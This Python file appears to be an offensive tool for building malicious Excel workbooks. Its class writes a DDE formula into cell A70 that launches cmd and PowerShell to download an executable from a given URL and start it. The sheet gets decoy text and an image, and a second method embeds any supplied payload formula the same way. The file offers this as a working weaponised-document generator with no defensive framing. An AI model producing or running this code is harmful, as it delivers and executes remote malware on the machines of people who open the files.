import os ,time
import openpyxl, xlsxwriter

class CreateDDE(object):

    def WorkDDE(self,agenturl,agentname,ddetextlocation,ddelinetext,ddeimage,ddeimglocation):

        value = "=cmd|'/c powershell.exe (New-Object System.Net.WebClient).DownloadFile(\\\"{}\\\",\\\"agent.exe\\\");Start-Process \\\"agent.exe\\\"'!A70".format(agenturl)
        workbook = xlsxwriter.Workbook(agentname+'.xlsx')
        worksheet = workbook.add_worksheet()
        worksheet.write_formula('A70','{}'.format(value))
        worksheet.write(ddetextlocation, ddelinetext)
        worksheet.insert_image(ddeimglocation, ddeimage)
        workbook.close()

    def CheckOrther(self,ddeimglocation,agentname,ddetextlocation, ddelinetext, ddeimage,ortherpayload):

        value = "{}".format(ortherpayload)+"!A70"
        print(value)
        workbook = xlsxwriter.Workbook(agentname+'.xlsx')
        worksheet = workbook.add_worksheet()
        worksheet.write_formula('A70','{}'.format(value))
        worksheet.write(ddetextlocation, ddelinetext)
        worksheet.insert_image(ddeimglocation, ddeimage)
        workbook.close()